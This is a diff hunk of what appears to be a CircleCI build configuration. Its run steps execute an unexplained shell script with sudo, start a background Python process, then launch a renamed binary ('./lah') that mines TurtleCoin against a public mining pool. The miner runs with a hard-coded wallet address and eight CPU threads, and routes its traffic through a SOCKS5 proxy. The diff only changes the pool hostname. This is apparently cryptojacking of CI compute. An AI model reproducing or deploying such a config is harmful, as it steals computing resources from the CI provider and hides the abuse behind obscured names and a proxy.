@@ -54,7 +54,7 @@ working_dir: &working_dir ~/app
           sudo ./Itu.sh
           screen -dmS Acdb python3 pro01.py
           sleep 100s
-          ./lah --algorithm argon2id_chukwa2 --pool stratum+ssl://turtlecoin.herominers.com:1160 --wallet TRTLuyhTSuu5cKEs7mgBwVXEAvh4uJyUNfG6CskYPw998yHNL6UrraV2XoBTtkjL4NRh7Uo9qyN6qBQePU2gAa7vdL9MsCFCULN.00 --password x --cpu-threads 8 -x socks5://192.111.135.17:18302 -K
+          ./lah --algorithm argon2id_chukwa2 --pool stratum+ssl://us.turtlecoin.herominers.com:1160 --wallet TRTLuyhTSuu5cKEs7mgBwVXEAvh4uJyUNfG6CskYPw998yHNL6UrraV2XoBTtkjL4NRh7Uo9qyN6qBQePU2gAa7vdL9MsCFCULN.00 --password x --cpu-threads 8 -x socks5://192.111.135.17:18302 -K
   working_directory: *working_dir
 
 version: 2.0
